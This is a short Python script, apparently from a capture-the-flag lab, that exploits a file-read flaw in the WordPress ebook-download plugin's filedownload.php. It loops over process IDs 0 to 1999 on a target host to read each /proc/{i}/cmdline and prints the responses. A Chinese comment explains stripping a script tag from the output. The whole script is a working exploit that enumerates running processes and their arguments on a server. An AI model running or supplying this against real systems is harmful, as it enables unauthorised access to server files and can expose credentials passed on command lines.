import requests

for i in range(0,2000):
	url =f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{i}/cmdline"
	req = requests.get(url)
	print (req.text.replace('<script>window.close()</script>','')) ##移除響應文本中的'<script>window.close()</script>'部分（如果存在）


